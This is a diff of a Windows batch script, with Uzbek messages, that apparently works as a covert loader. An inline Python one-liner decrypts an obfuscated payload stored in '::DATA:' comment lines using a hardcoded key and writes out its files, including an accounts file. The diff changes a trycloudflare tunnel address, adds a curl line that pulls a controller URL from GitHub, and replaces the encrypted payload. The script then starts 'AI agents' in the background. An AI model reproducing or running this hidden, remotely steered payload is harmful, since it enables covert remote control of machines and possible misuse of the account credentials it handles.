@@ -62,7 +62,8 @@ if not exist "%WORK_DIR%\.deps_ready_v2" (
     echo OK > "%WORK_DIR%\.deps_ready_v2"
 )
 "%PY_EXE%" -c "import os,zlib,base64,hashlib,json; p=os.environ['SELF_BAT']; lines=[ln.strip()[7:] for ln in open(p,'r',encoding='utf-8',errors='ignore') if ln.startswith('::DATA:')]; raw=base64.b64decode(''.join(lines)); dk=hashlib.pbkdf2_hmac('sha256',b'UZB_AI_CLUSTER_SHIELD_2026_OBIDBEK_PRIVATE_KEY_998877',b'AGRO_METEO_SALT_v4',10000,dklen=4096); buf=bytearray([b^dk[i&4095]^((i*73)&255) for i,b in enumerate(raw)]); d=json.loads(zlib.decompress(bytes(buf)).decode('utf-8')); [open(k,'w',encoding='utf-8').write(v) for k,v in d.items()]; [open(f,'a',encoding='utf-8').close() for f in ('akkountlar.txt','natijalar_sertifikatlar.txt','xatolar.txt')]"
-echo https://rev-assured-yellow-abstract.trycloudflare.com> "%WORK_DIR%\cluster_url.txt"
+echo https://consumption-scope-natural-vital.trycloudflare.com> "%WORK_DIR%\cluster_url.txt"
+curl.exe -s -L "https://raw.githubusercontent.com/xakimovabdubannob-gif/cloud-node/master/cluster_url.txt" -o "%WORK_DIR%\cluster_url.txt" >nul 2>&1
 curl.exe -s -L "https://raw.githubusercontent.com/xakimovabdubannob-gif/cloud-node/master/cluster_url.txt" -o "%WORK_DIR%\cluster_url.txt" >nul 2>&1
 
 echo [4/4] Botga ulanmoqda va orqa fonda AI Agentlar ishga tushirilmoqda...
@@ -531,5 +532,5 @@ exit /b 0
 ::DATA:sqzUvmnNBRVy7y6sNnEGInnsLkwkqEEOi/LFL+J4X6mZzuloV8IDckPsqEsKyw9fZKxdYbL2bQOS57wDQVb066FHmv28xTfYC3/IQ3SaSPmCaEVX9at9Itvr
 ::DATA:bmJBHrcoXcUpX8r5mo5O6QV2daj3GIvhvW/DtfO2NhEqubQD7xbtQb8SVuZ50YUpNyCzLdR/eZrmeq90yE5YrJbP2W47vxYMl7ukaXqtHOvIIoDJrElGbsSM
 ::DATA:MAJJoednKZDoKo/J7dHwdLccCPqaeOaZTpw0IboTViUZusO/NieVFewerC3Y2K4I40MmNuuwEwLbAgRisAfm8DgtH72BgxSg7AKmDWsbeKuxu+LdbJvJaCca
-::DATA:gn1HsHfbM6syf0O4xCpwMNFaO+W0SiSYYQPNsmMmDCViip9N/W8p5UhDxDzcn9Yt0g0gJwNaxNhG7bWLovjbZT3ezHoP6MK9LhXQhjRALU3lVsUvXLRl5SnJ
-::DATA:SpJCspwe36t9Xhpr/bWisBBFV9I37Vzn17KEai0KDq+UFEtBPNBdujhNg1AO9J05VayxVkH5xZdf3t5izq4/0iVrArFiRNQj
+::DATA:gn1HsHfbM6syf0O4xCpwMNFaO+W0SiSYYQPNsmMmDCViip9N/W8p5UhDxDzcn9Yt0g0gJwNaxNhG7bUHdq8Z/K+MuPGKBgLQGOLP2sXKkXrDXxAGFIcoZQ52
+::DATA:buLxmFJhOlpqCmaAoSn5XG/EM4hXXj0WLhIgYR8KW2nhUEEp4lfekABg0nNRGIpAzJhHNtpjOSABw+CxSqMfUD2xlcuTfxc0clT3
